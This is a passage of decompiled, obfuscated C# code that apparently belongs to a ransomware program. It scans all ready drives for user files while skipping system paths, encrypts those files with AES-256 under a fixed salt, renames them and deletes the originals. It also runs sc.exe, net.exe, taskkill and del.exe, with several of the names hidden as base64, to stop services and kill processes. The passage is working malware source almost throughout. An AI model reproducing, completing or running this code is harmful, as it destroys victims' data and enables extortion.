            System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "Error while writing Temp Folder Report: " + ex1.Message + "\r\n");
          }
          catch (Exception ex2)
          {
          }
        }
      }
      return path;
    }

    private static void SPaVkRNulTSot(
      [In] string[] obj0,
      [In] string[] obj1,
      [In] string[] obj2,
      [In] string obj3,
      [In] string obj4)
    {
      BErRpdYOfQAwSr.HKEvdbLCkKIV hkEvdbLckKiv = new BErRpdYOfQAwSr.HKEvdbLCkKIV();
      hkEvdbLckKiv.wvBPXomTVGYyo = obj1;
      hkEvdbLckKiv.ZxnwAJqsazOQUB = obj2;
      hkEvdbLckKiv.PzYMtvwFVOWwOfS = obj3;
      hkEvdbLckKiv.jhLgXzNXSRNS = obj4;
      BErRpdYOfQAwSr.vzfvEbaMMJjzL = Encoding.ASCII.GetBytes(hkEvdbLckKiv.PzYMtvwFVOWwOfS);
      DriveInfo[] driveInfoArray = (DriveInfo[]) null;
      if (obj0[0] == "[auto]")
      {
        try
        {
          driveInfoArray = DriveInfo.GetDrives();
        }
        catch (Exception ex)
        {
        }
        if (driveInfoArray.Length > 0)
        {
          for (int index = 0; index < driveInfoArray.Length; ++index)
          {
            if (driveInfoArray[index].IsReady && driveInfoArray[index].DriveType != DriveType.CDRom && !BErRpdYOfQAwSr.nMCOBGfKnYn.Contains(driveInfoArray[index].Name))
              BErRpdYOfQAwSr.nMCOBGfKnYn.Add(driveInfoArray[index].Name);
          }
        }
      }
      else
      {
        for (int index = 0; index < obj0.Length; ++index)
        {
          if (!BErRpdYOfQAwSr.nMCOBGfKnYn.Contains(obj0[index]))
            BErRpdYOfQAwSr.nMCOBGfKnYn.Add(obj0[index]);
        }
      }
      if (BErRpdYOfQAwSr.nMCOBGfKnYn.Contains(BErRpdYOfQAwSr.oMKRHTBqYRfOk("Qzpc")) && BErRpdYOfQAwSr.qFDgnyGhwfm == "YES")
        BErRpdYOfQAwSr.nMCOBGfKnYn.Remove(BErRpdYOfQAwSr.oMKRHTBqYRfOk("Qzpc"));
      if (BErRpdYOfQAwSr.HkcjRmtfzgYbbl == "YES")
      {
        if (BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate2b == null)
          BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate2b = new ThreadStart(BErRpdYOfQAwSr.\u003CCrypt\u003Eb__27);
        new Thread(BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate2b)
        {
          IsBackground = true,
          Priority = ThreadPriority.Normal
        }.Start();
      }
      Parallel.ForEach<string>((IEnumerable<string>) BErRpdYOfQAwSr.nMCOBGfKnYn, new Action<string>(hkEvdbLckKiv.\u003CCrypt\u003Eb__28));
    }

    public static void zyEnlTcIHqYR(
      [In] string obj0,
      [In] string[] obj1,
      [In] string obj2,
      [In] string[] obj3,
      [In] string obj4)
    {
      List<string> stringList1 = new List<string>();
      List<string> stringList2 = new List<string>()
      {
        ""
      };
      if (BErRpdYOfQAwSr.CKQbZpYfqsJAt == "NO")
      {
        if (BErRpdYOfQAwSr.nsyymqqKpcXoy == "YES" && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && BErRpdYOfQAwSr.AamQmrXSkACS(obj0))
        {
          pkuvpdbqQlESF source;
          try
          {
            source = new pkuvpdbqQlESF(obj0.Replace("\\", ""));
          }
          catch
          {
            stringList1 = BErRpdYOfQAwSr.jxPpLMoTLhR(obj0, obj1, obj2, obj3, obj4);
            return;
          }
          try
          {
            BErRpdYOfQAwSr.vDTDGwOisXmcJ(((IEnumerable<string>) source.ToArray<string>()).ToList<string>(), obj1, obj2, obj3, obj4);
          }
          catch (Exception ex)
          {
            stringList1 = BErRpdYOfQAwSr.jxPpLMoTLhR(obj0, obj1, obj2, obj3, obj4);
          }
        }
        else
          stringList1 = BErRpdYOfQAwSr.jxPpLMoTLhR(obj0, obj1, obj2, obj3, obj4);
      }
      else
      {
        List<string> stringList3 = BErRpdYOfQAwSr.idxqNCEhMqUbBAPj.SearchFiles(obj0);
        foreach (string str1 in obj1)
        {
          using (List<string>.Enumerator enumerator = stringList3.GetEnumerator())
          {
label_44:
            while (enumerator.MoveNext())
            {
              string current = enumerator.Current;
              if (obj3.Length != 0)
              {
                foreach (string str2 in obj3)
                {
                  if (current.EndsWith(str2))
                    goto label_44;
                }
              }
              if ((!(BErRpdYOfQAwSr.SHnoEunPucmQ == "NO") || current.EndsWith(str1)) && !BErRpdYOfQAwSr.TZzJBVGXhjZB.Contains(current))
              {
                if (BErRpdYOfQAwSr.NvrJrGCLFM == "YES")
                {
                  try
                  {
                    if (mNZEakGpRFrLn.BzymlTUToS(current))
                      mNZEakGpRFrLn.yMPBlYJpSCfxjv(current);
                  }
                  catch
                  {
                  }
                }
                BErRpdYOfQAwSr.TZzJBVGXhjZB.Add(current);
                if (!BErRpdYOfQAwSr.igfzwruhwWDXY.Contains(Path.GetDirectoryName(current)))
                  BErRpdYOfQAwSr.igfzwruhwWDXY.Add(Path.GetDirectoryName(current));
                try
                {
                  FileStream fileStream = new FileStream(current, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                  if (BErRpdYOfQAwSr.YvhlPQrYyPhB == "YES" && fileStream.Length > (long) (Convert.ToInt32(BErRpdYOfQAwSr.XZspBinZvbc) * 1024 * 1024) && !stringList2.Contains(str1))
                  {
                    if (BErRpdYOfQAwSr.XiSfijQzOr == "YES")
                    {
                      foreach (string str3 in BErRpdYOfQAwSr.HLlzhaBALyehKMW)
                      {
                        if (current.ToLower().EndsWith(str3) && BErRpdYOfQAwSr.LNfftKTeaLEJxe == "YES")
                        {
                          if ((long) (Convert.ToInt32(BErRpdYOfQAwSr.jUyryfTlTABVm) * 1024 * 1024) > fileStream.Length)
                          {
                            try
                            {
                              BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: current);
                            }
                            catch
                            {
                            }
                          }
                        }
                        else if (current.ToLower().EndsWith(str3))
                        {
                          if (BErRpdYOfQAwSr.LNfftKTeaLEJxe == "NO")
                          {
                            try
                            {
                              BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: current);
                            }
                            catch
                            {
                            }
                          }
                        }
                      }
                    }
                    fileStream.Dispose();
                    byte[] DWszvBlRCViF = luIgktEtlHVR.ZnyJbIPDofh(luIgktEtlHVR.sjLnWbxhrKF(current, Convert.ToInt32(BErRpdYOfQAwSr.XZspBinZvbc) * 1024 * 1024), Encoding.ASCII.GetBytes(obj4), new byte[8]
                    {
                      (byte) 1,
                      (byte) 2,
                      (byte) 3,
                      (byte) 4,
                      (byte) 5,
                      (byte) 6,
                      (byte) 7,
                      (byte) 8
                    });
                    luIgktEtlHVR.SEcBXBtSwKeqJ(current, DWszvBlRCViF);
                    if (obj2 != ".*")
                      System.IO.File.Move(current, current + obj2);
                  }
                  else if (obj2 != ".*")
                    BErRpdYOfQAwSr.FKKdtpPOXcixG(current, current + obj2, BErRpdYOfQAwSr.vzfvEbaMMJjzL);
                  else
                    BErRpdYOfQAwSr.FKKdtpPOXcixG(current, current + ".part", BErRpdYOfQAwSr.vzfvEbaMMJjzL);
                }
                catch (Exception ex)
                {
                }
              }
            }
          }
        }
      }
    }

    public static void vDTDGwOisXmcJ(
      [In] List<string> obj0,
      [In] string[] obj1,
      [In] string obj2,
      [In] string[] obj3,
      [In] string obj4)
    {
      Action<string> action1 = (Action<string>) null;
      Action<string> action2 = (Action<string>) null;
      BErRpdYOfQAwSr.JysbNTrlmOEbMFT jysbNtrlmOebMft = new BErRpdYOfQAwSr.JysbNTrlmOEbMFT();
      jysbNtrlmOebMft.TEsRQlBGMsrM = obj0;
      jysbNtrlmOebMft.zRrhleDkDu = obj2;
      jysbNtrlmOebMft.YgvmapaKkT = obj3;
      jysbNtrlmOebMft.FYndIeNOJJCR = obj4;
      jysbNtrlmOebMft.BFhdaeESOcRrvA = new List<string>()
      {
        ""
      };
      if (BErRpdYOfQAwSr.SHnoEunPucmQ == "NO")
      {
        string[] source = obj1;
        if (action1 == null)
          action1 = new Action<string>(jysbNtrlmOebMft.\u003CWorkerCrypter2\u003Eb__36);
        Action<string> body = action1;
        Parallel.ForEach<string>((IEnumerable<string>) source, body);
      }
      else
      {
        List<string> tesRqlBgMsrM = jysbNtrlmOebMft.TEsRQlBGMsrM;
        if (action2 == null)
          action2 = new Action<string>(jysbNtrlmOebMft.\u003CWorkerCrypter2\u003Eb__38);
        Action<string> body = action2;
        Parallel.ForEach<string>((IEnumerable<string>) tesRqlBgMsrM, body);
      }
    }

    private static void FKKdtpPOXcixG([In] string obj0, [In] string obj1, [In] byte[] obj2)
    {
      try
      {
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        FileStream fileStream1 = new FileStream(obj1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(obj2, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Padding = PaddingMode.Zeros;
        rijndaelManaged.Mode = CipherMode.CBC;
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
        FileStream fileStream2 = new FileStream(obj0, FileMode.Open);
        int num1;
        while ((num1 = fileStream2.ReadByte()) != -1)
          cryptoStream.WriteByte((byte) num1);
        fileStream2.Dispose();
        cryptoStream.Dispose();
        fileStream1.Dispose();
        try
        {
          if (obj1.Length > 0)
          {
            FileStream fileStream3 = new FileStream(obj0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
            if (BErRpdYOfQAwSr.XiSfijQzOr == "YES")
            {
              foreach (string str in BErRpdYOfQAwSr.HLlzhaBALyehKMW)
              {
                if (obj0.ToLower().EndsWith(str) && BErRpdYOfQAwSr.LNfftKTeaLEJxe == "YES")
                {
                  if ((long) (Convert.ToInt32(BErRpdYOfQAwSr.jUyryfTlTABVm) * 1024 * 1024) > fileStream3.Length)
                  {
                    try
                    {
                      BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: obj0);
                    }
                    catch
                    {
                    }
                  }
                }
                else if (obj0.ToLower().EndsWith(str))
                {
                  if (BErRpdYOfQAwSr.LNfftKTeaLEJxe == "NO")
                  {
                    try
                    {
                      BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: obj0);
                    }
                    catch
                    {
                    }
                  }
                }
              }
            }
            fileStream3.Dispose();
            int num2 = 1000000;
            while (true)
            {
              try
              {
                while (System.IO.File.Exists(obj0))
                {
                  if (num2 >= 0)
                    System.IO.File.Delete(obj0);
                  else
                    break;
                }
                break;
              }
              catch
              {
                --num2;
              }
            }
            if (!obj1.EndsWith(".part"))
              return;
            System.IO.File.Move(obj1, obj1.Replace(".part", ""));
          }
          else
          {
            try
            {
              System.IO.File.Delete(obj1);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static void aaxjshgqLTvRmFF([In] string obj0, [In] string obj1, [In] byte[] obj2)
    {
      if (BErRpdYOfQAwSr.XiSfijQzOr == "YES")
      {
        FileStream fileStream = new FileStream(obj0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
        foreach (string str in BErRpdYOfQAwSr.HLlzhaBALyehKMW)
        {
          if (obj0.ToLower().EndsWith(str) && BErRpdYOfQAwSr.LNfftKTeaLEJxe == "YES")
          {
            if ((long) (Convert.ToInt32(BErRpdYOfQAwSr.jUyryfTlTABVm) * 1024 * 1024) > fileStream.Length)
            {
              try
              {
                BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: obj0);
              }
              catch
              {
              }
            }
          }
          else if (obj0.ToLower().EndsWith(str))
          {
            if (BErRpdYOfQAwSr.LNfftKTeaLEJxe == "NO")
            {
              try
              {
                BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: obj0);
              }
              catch
              {
              }
            }
          }
        }
        fileStream.Dispose();
      }
      byte[] bytes = rkaJvaLxSApP.XSSYjgejGHjLCQ(System.IO.File.ReadAllBytes(obj0), obj2, new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      });
      System.IO.File.WriteAllBytes(obj0, bytes);
      if (!(obj0 != obj1))
        return;
      System.IO.File.Move(obj0, obj1);
    }

    private static void IbxvsuFDJGCHw([In] string obj0, [In] string obj1, [In] byte[] obj2)
    {
      ThreadStart start1 = (ThreadStart) null;
      ThreadStart start2 = (ThreadStart) null;
      BErRpdYOfQAwSr.tsCGCqSymQuu tsCgCqSymQuu = new BErRpdYOfQAwSr.tsCGCqSymQuu();
      tsCgCqSymQuu.UZavYxvKDEAva = obj0;
      tsCgCqSymQuu.vxjqxeajvIhW = obj1;
      try
      {
        byte[] salt = new byte[8]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8
        };
        FileStream fileStream1 = new FileStream(tsCgCqSymQuu.vxjqxeajvIhW, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
        RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(obj2, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Padding = PaddingMode.Zeros;
        rijndaelManaged.Mode = CipherMode.CBC;
        CryptoStream cryptoStream = new CryptoStream((Stream) fileStream1, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
        try
        {
          if (BErRpdYOfQAwSr.KGlWteEpKYfz == "YES")
          {
            MemoryMappedFile fromFile = MemoryMappedFile.CreateFromFile(tsCgCqSymQuu.UZavYxvKDEAva, FileMode.Open);
            MemoryMappedViewStream viewStream = fromFile.CreateViewStream();
            fromFile.Dispose();
            int num;
            while ((num = viewStream.ReadByte()) != -1)
              cryptoStream.WriteByte((byte) num);
            viewStream.Dispose();
          }
          else
          {
            FileStream fileStream2 = new FileStream(tsCgCqSymQuu.UZavYxvKDEAva, FileMode.Open);
            int num;
            while ((num = fileStream2.ReadByte()) != -1)
              cryptoStream.WriteByte((byte) num);
            fileStream2.Dispose();
          }
        }
        catch (Exception ex)
        {
          FileStream fileStream3 = new FileStream(tsCgCqSymQuu.UZavYxvKDEAva, FileMode.Open);
          int num;
          while ((num = fileStream3.ReadByte()) != -1)
            cryptoStream.WriteByte((byte) num);
          fileStream3.Dispose();
        }
        cryptoStream.Dispose();
        fileStream1.Dispose();
        try
        {
          if (tsCgCqSymQuu.vxjqxeajvIhW.Length > 0)
          {
            if (BErRpdYOfQAwSr.XiSfijQzOr == "YES")
            {
              FileStream fileStream4 = new FileStream(tsCgCqSymQuu.UZavYxvKDEAva, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
              foreach (string str in BErRpdYOfQAwSr.HLlzhaBALyehKMW)
              {
                if (tsCgCqSymQuu.UZavYxvKDEAva.ToLower().EndsWith(str) && BErRpdYOfQAwSr.LNfftKTeaLEJxe == "YES")
                {
                  if ((long) (Convert.ToInt32(BErRpdYOfQAwSr.jUyryfTlTABVm) * 1024 * 1024) > fileStream4.Length)
                  {
                    try
                    {
                      BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: tsCgCqSymQuu.UZavYxvKDEAva);
                    }
                    catch
                    {
                    }
                  }
                }
                else if (tsCgCqSymQuu.UZavYxvKDEAva.ToLower().EndsWith(str))
                {
                  if (BErRpdYOfQAwSr.LNfftKTeaLEJxe == "NO")
                  {
                    try
                    {
                      BhEjWEybWo.UKsatUgrFHrdZ(FsNymxUZdUYu: tsCgCqSymQuu.UZavYxvKDEAva);
                    }
                    catch
                    {
                    }
                  }
                }
              }
              fileStream4.Dispose();
            }
            if (start1 == null)
              start1 = new ThreadStart(tsCgCqSymQuu.\u003CEncrypt2\u003Eb__46);
            new Thread(start1)
            {
              Priority = ThreadPriority.Normal,
              IsBackground = true
            }.Start();
            if (!tsCgCqSymQuu.vxjqxeajvIhW.EndsWith(".part"))
              return;
            System.IO.File.Move(tsCgCqSymQuu.vxjqxeajvIhW, tsCgCqSymQuu.vxjqxeajvIhW.Replace(".part", ""));
          }
          else
          {
            if (start2 == null)
              start2 = new ThreadStart(tsCgCqSymQuu.\u003CEncrypt2\u003Eb__47);
            new Thread(start2)
            {
              Priority = ThreadPriority.Normal,
              IsBackground = true
            }.Start();
          }
        }
        catch
        {
        }
      }
      catch (Exception ex1)
      {
        if (!BErRpdYOfQAwSr.vQOhJPfkmenqxsh)
          return;
        try
        {
          System.IO.File.AppendAllText(BErRpdYOfQAwSr.OpWBXzCwVRYsxq, "File: " + tsCgCqSymQuu.UZavYxvKDEAva + " - Error while fully writing to file: " + ex1.Message + "\r\n");
        }
        catch (Exception ex2)
        {
        }
      }
    }

    private static void \u003CMain\u003Eb__9()
    {
      List<string> lsWtVcsEzBtl = BErRpdYOfQAwSr.lsWtVCsEzBTL;
      if (BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate16 == null)
        BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate16 = new Action<string>(BErRpdYOfQAwSr.\u003CMain\u003Eb__a);
      Action<string> methodDelegate16 = BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate16;
      Parallel.ForEach<string>((IEnumerable<string>) lsWtVcsEzBtl, methodDelegate16);
      List<string> yYvMwQiiRucF = BErRpdYOfQAwSr.yYvMwQIIRucF;
      if (BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate17 == null)
        BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate17 = new Action<string>(BErRpdYOfQAwSr.\u003CMain\u003Eb__b);
      Action<string> methodDelegate17 = BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate17;
      Parallel.ForEach<string>((IEnumerable<string>) yYvMwQiiRucF, methodDelegate17);
      List<string> vptJpYjhZlMrm = BErRpdYOfQAwSr.vptJpYJhZlMRM;
      if (BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate18 == null)
        BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate18 = new Action<string>(BErRpdYOfQAwSr.\u003CMain\u003Eb__c);
      Action<string> methodDelegate18 = BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate18;
      Parallel.ForEach<string>((IEnumerable<string>) vptJpYjhZlMrm, methodDelegate18);
      if (BErRpdYOfQAwSr.VnmuFCXwLb == "YES")
      {
        string[] olEsalIpjXyhSzEgg = BErRpdYOfQAwSr.OlEsalIPJXyhSZEgg;
        if (BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate19 == null)
          BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate19 = new Action<string>(BErRpdYOfQAwSr.\u003CMain\u003Eb__d);
        Action<string> methodDelegate19 = BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate19;
        Parallel.ForEach<string>((IEnumerable<string>) olEsalIpjXyhSzEgg, methodDelegate19);
      }
      if (!BErRpdYOfQAwSr.OLRxBoNESYHA().Contains("XP"))
      {
        BErRpdYOfQAwSr.EnvRhAFwnNeKeW(BErRpdYOfQAwSr.PgMUbAxWXI);
      }
      else
      {
        List<string> jncObsVmzwaXqv = BErRpdYOfQAwSr.JNcObsVMzwaXqv;
        if (BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1a == null)
          BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1a = new Action<string>(BErRpdYOfQAwSr.\u003CMain\u003Eb__e);
        Action<string> methodDelegate1a = BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1a;
        Parallel.ForEach<string>((IEnumerable<string>) jncObsVmzwaXqv, methodDelegate1a);
      }
      List<string> aNwBuUqhGtLfvJ = BErRpdYOfQAwSr.aNwBUUqhGtLFvJ;
      if (BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1b == null)
        BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1b = new Action<string>(BErRpdYOfQAwSr.\u003CMain\u003Eb__f);
      Action<string> methodDelegate1b = BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1b;
      Parallel.ForEach<string>((IEnumerable<string>) aNwBuUqhGtLfvJ, methodDelegate1b);
      List<string> uGhbylBfRrA = BErRpdYOfQAwSr.uGHBYLBfRrA;
      if (BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1c == null)
        BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1c = new Action<string>(BErRpdYOfQAwSr.\u003CMain\u003Eb__10);
      Action<string> methodDelegate1c = BErRpdYOfQAwSr.CS\u0024\u003C\u003E9__CachedAnonymousMethodDelegate1c;
      Parallel.ForEach<string>((IEnumerable<string>) uGhbylBfRrA, methodDelegate1c);
    }

    private static void \u003CMain\u003Eb__a([In] string obj0) => BErRpdYOfQAwSr.uATAppcKlZ("sc.exe", obj0);

    private static void \u003CMain\u003Eb__b([In] string obj0) => BErRpdYOfQAwSr.uATAppcKlZ("net.exe", obj0);

    private static void \u003CMain\u003Eb__c([In] string obj0) => BErRpdYOfQAwSr.uATAppcKlZ(BErRpdYOfQAwSr.oMKRHTBqYRfOk("dGFza2tpbGwuZXhl"), obj0);

    private static void \u003CMain\u003Eb__d([In] string obj0) => BErRpdYOfQAwSr.uATAppcKlZ(BErRpdYOfQAwSr.oMKRHTBqYRfOk("dGFza2tpbGwuZXhl"), "/IM " + obj0 + " /f");

    private static void \u003CMain\u003Eb__e([In] string obj0) => BErRpdYOfQAwSr.uATAppcKlZ(BErRpdYOfQAwSr.oMKRHTBqYRfOk(BErRpdYOfQAwSr.IPHxEYiEhccEgJV("lhXZu4WatRWYzNnd")), obj0);

    private static void \u003CMain\u003Eb__f([In] string obj0) => BErRpdYOfQAwSr.uATAppcKlZ(BErRpdYOfQAwSr.oMKRHTBqYRfOk("ZGVsLmV4ZQ=="), obj0);

    private static void \u003CMain\u003Eb__10([In] string obj0) => BErRpdYOfQAwSr.uATAppcKlZ("icacls", obj0);

    private static void \u003CCrypt\u003Eb__27() => dpxXqfoOJPmxWa.SqJQCZvGgamgp();

    public class idxqNCEhMqUbBAPj
    {
      private static StringCollection fLpFrQPozAVXl = new StringCollection();
      private static List<string> eBQDwDAKInKCaYF = new List<string>();

      public static List<string> SearchFiles([In] string obj0)
      {
        List<string> stringList = new List<string>();
        return BErRpdYOfQAwSr.idxqNCEhMqUbBAPj.WalkDirectoryTree(obj0);
      }

      private static List<string> WalkDirectoryTree([In] string obj0)
      {
        string[] strArray = (string[]) null;
        try
        {
          strArray = Directory.GetFiles(obj0, "*.*");
        }
        catch
        {
        }
        if (strArray != null)
        {
          foreach (string path in strArray)
          {
            try
            {
              if (!path.ToLower().Contains("program files"))
              {
                if (!path.ToLower().Contains("windows"))
                {
                  if (!path.ToLower().Contains("perflogs"))
                  {
                    if (!path.ToLower().Contains("internet explorer"))
                    {
                      if (!path.ToLower().Contains("programdata"))
                      {
                        if (!path.ToLower().Contains("appdata"))
                        {
                          if (!path.ToLower().Contains("autoexec.bat"))
                          {
                            if (!path.ToLower().Contains("desktop.ini"))
                            {
                              if (!path.ToLower().Contains("autorun.inf"))
                              {
                                if (!path.ToLower().Contains("ntuser.dat"))
                                {
                                  if (!path.ToLower().Contains("iconcache.db"))
                                  {
                                    if (!path.ToLower().Contains("bootsect.bak"))
                                    {
                                      if (!path.ToLower().Contains("boot.ini"))
                                      {
                                        if (!path.ToLower().Contains("ntuser.dat.log"))
                                        {
                                          if (!path.ToLower().Contains("thumbs.db"))
                                          {
                                            if (!path.ToLower().Contains("bootmgr"))
                                            {
                                              if (!path.ToLower().Contains("pagefile.sys"))
                                              {
                                                if (!path.ToLower().Contains("config.sys"))
                                                {
                                                  if (!path.ToLower().Contains("ntuser.ini"))
                                                  {
                                                    if (!path.Contains(BErRpdYOfQAwSr.oMKRHTBqYRfOk("QnVpbGRlcl9Mb2c=")))
                                                    {
                                                      if (!path.Contains("RSAKeys"))
                                                      {
                                                        if (!path.Contains("Инструкция"))
                                                        {
                                                          if (!path.EndsWith(".secure"))
                                                          {
                                                            if (!path.EndsWith("exe"))
                                                            {
                                                              if (!path.EndsWith("dll"))
                                                              {
                                                                if (!path.EndsWith("EXE"))
                                                                {
                                                                  if (!path.EndsWith("DLL"))
                                                                  {
                                                                    if (!path.ToLower().Contains("Recycle.Bin"))
                                                                    {
                                                                      if (!path.ToLower().Contains(BErRpdYOfQAwSr.SGHDaCxgQr))
                                                                      {
                                                                        if (System.IO.File.Exists(path) && (double) path.Length <= double.Parse(BErRpdYOfQAwSr.FIbXXLCVARq) * 1024.0 * 1024.0 && BErRpdYOfQAwSr.ZrRHitKveMxniC == "YES")
                                                                          BErRpdYOfQAwSr.idxqNCEhMqUbBAPj.eBQDwDAKInKCaYF.Add(path);
                                                                        else if (System.IO.File.Exists(path))
                                                                        {
                                                                          if (BErRpdYOfQAwSr.ZrRHitKveMxniC == "NO")
                                                                            BErRpdYOfQAwSr.idxqNCEhMqUbBAPj.eBQDwDAKInKCaYF.Add(path);
                                                                        }
                                                                      }
                                                                    }
                                                                  }
                                                                }
                                                              }
                                                            }
                                                          }
                                                        }
                                                      }
                                                    }
                                                  }
                                                }
                                              }
                                            }
                                          }
                                        }
                                      }
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
            catch
            {
            }
          }
          foreach (string directory in Directory.GetDirectories(obj0))
            BErRpdYOfQAwSr.idxqNCEhMqUbBAPj.WalkDirectoryTree(directory);
        }
        return BErRpdYOfQAwSr.idxqNCEhMqUbBAPj.eBQDwDAKInKCaYF;
      }
    }

    private sealed class uwwAILDuwIQs
    {
      public string ZERToGKXzmayuo;

      public bool \u003CMain\u003Eb__7([In] Process obj0) => obj0.ProcessName == this.ZERToGKXzmayuo;
    }

    private sealed class VjMyonYihPlVlJK
    {
      public string[] HWzAhZljHiEK;

      public void \u003CMain\u003Eb__8() => VqpeLWAVRhnNLC.BJvMQPSHzrRdKdx(this.HWzAhZljHiEK);
    }

    private sealed class WYVxZrhpKQNU
    {
      public string uAYBqoxFKKpTW;

      public bool \u003CIsDriveNTFS\u003Eb__21([In] DriveInfo obj0) => obj0.RootDirectory.Name == this.uAYBqoxFKKpTW;
    }

    private sealed class HKEvdbLCkKIV
    {
      public string[] wvBPXomTVGYyo;
      public string[] ZxnwAJqsazOQUB;
      public string PzYMtvwFVOWwOfS;
      public string jhLgXzNXSRNS;

      public void \u003CCrypt\u003Eb__28([In] string obj0)
      {
        ThreadStart start1 = (ThreadStart) null;
        ThreadStart start2 = (ThreadStart) null;
        BErRpdYOfQAwSr.HKEvdbLCkKIV.NkspxIhkZAcghDC nkspxIhkZacghDc = new BErRpdYOfQAwSr.HKEvdbLCkKIV.NkspxIhkZAcghDC();
        nkspxIhkZacghDc.PgEGNEZOzoH = this;
        nkspxIhkZacghDc.GEoFpfKGMjKCZwQ = obj0;
        if (BErRpdYOfQAwSr.qsDIrveZaNzAq && !BErRpdYOfQAwSr.OLRxBoNESYHA().Contains("XP"))
        {
          if (start1 == null)
            start1 = new ThreadStart(nkspxIhkZacghDc.\u003CCrypt\u003Eb__29);
          new Thread(start1)
          {
            Priority = ThreadPriority.Normal,
            IsBackground = true
          }.Start();
        }
        if (BErRpdYOfQAwSr.dQHMXFnCEYNSw == "YES")
        {
          if (start2 == null)
            start2 = new ThreadStart(nkspxIhkZacghDc.\u003CCrypt\u003Eb__2a);
          Thread thread = new Thread(start2);
          thread.Priority = ThreadPriority.Normal;
          thread.IsBackground = false;
          thread.Start();
          thread.Join();
        }
        else
          BErRpdYOfQAwSr.zyEnlTcIHqYR(nkspxIhkZacghDc.GEoFpfKGMjKCZwQ, this.wvBPXomTVGYyo, this.jhLgXzNXSRNS, this.ZxnwAJqsazOQUB, this.PzYMtvwFVOWwOfS);
      }

      private sealed class NkspxIhkZAcghDC
      {
        public BErRpdYOfQAwSr.HKEvdbLCkKIV PgEGNEZOzoH;
        public string GEoFpfKGMjKCZwQ;

        public void \u003CCrypt\u003Eb__29()
        {
          if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
            return;
          BErRpdYOfQAwSr.NHrsaNbqqwFFKh(WindowsIdentity.GetCurrent().Name, this.GEoFpfKGMjKCZwQ);
        }

